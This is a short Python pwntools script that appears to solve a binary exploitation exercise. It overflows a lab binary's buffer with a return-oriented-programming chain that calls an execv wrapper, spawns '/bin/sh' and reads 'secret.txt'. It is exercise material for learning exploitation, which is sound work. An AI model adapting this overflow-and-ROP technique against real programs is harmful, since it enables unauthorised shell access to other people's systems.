#!/usr/bin/python3

from pwn import *
import time

def exploit():
    # Write your exploit logic here.
    p = process("./gadget-exercise2.bin")
    safe = p64(0x400697)
    pop_rdi= p64(0x4007b3)
    rdi_addr= p64(0x601080)
    execv_wrp=p64(0x400676)
    p.send(b'a' * 0x28 + safe + pop_rdi +rdi_addr + execv_wrp)
    p.recvuntil(b'global buffer: ')
    p.send(b'/bin/sh\0')
    time.sleep(0.1)
    p.sendline(b'cat secret.txt')
    print(p.recvline())


if __name__ == "__main__":
    exploit()
